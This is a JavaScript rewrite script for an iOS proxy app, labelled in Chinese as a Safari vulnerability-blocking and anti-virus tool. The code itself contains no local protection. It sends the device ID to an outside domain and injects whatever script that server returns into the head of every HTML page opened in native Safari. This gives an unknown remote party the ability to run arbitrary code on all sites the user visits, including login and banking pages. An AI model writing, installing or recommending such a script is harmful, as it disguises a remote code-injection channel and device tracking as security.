/**
 * Safari漏洞封堵&病毒防范脚本 (云端验证 Version)
 * 作者：fiywind
 * Safari 漏洞封堵 Loader (原生判定版)
 * 作用：仅在原生 Safari 中注入 lockDown 物理封堵逻辑
 * 更新：2026-04-08
 */

const ua = $request.headers['User-Agent'] || $request.headers['user-agent'] || "";
const contentType = $response.headers['Content-Type'] || $response.headers['content-type'] || "";
const url = $request.url || "";

// 1. 熔断逻辑：识别微信、视频流、API 等非网页流量
const isApp = /MicroMessenger|WeChat|QQ\/|Weibo|XHS-App|NewsArticle|Toutiao|Alipay|MailMaster/i.test(ua);
const isVideoOrApi = /video\.qq\.com|weixin\.qq\.com|qlogo\.cn|apple\.com/i.test(url) || !contentType.includes("text/html");

// 2. 如果是 App 流量或非 HTML 网页，瞬间退出，绝不执行逻辑
if (isApp || isVideoOrApi || !$response.body) {
    $done({});
} else {
    // 3. 仅限原生 Safari 且是 HTML 网页时执行
    if (ua.includes("Safari") && ua.includes("Version/")) {
        const did = $environment.device_id;
        // 使用您的域名进行鉴权
        const authUrl = `https://bhip.cc.cd/?id=${did}`;

        $httpClient.get(authUrl, (err, resp, data) => {
            // 严格状态码校验，解决 Unauthorized 问题
            if (!err && resp.status === 200 && data.includes("WebAssembly")) {
                let body = $response.body.replace(/<head[^>]*>/i, `$&<script>${data}</script>`);
                console.log("🛡️ lockDown: Active on " + url);
                $done({ body });
            } else {
                $done({});
            }
        });
    } else {
        $done({});
    }
}
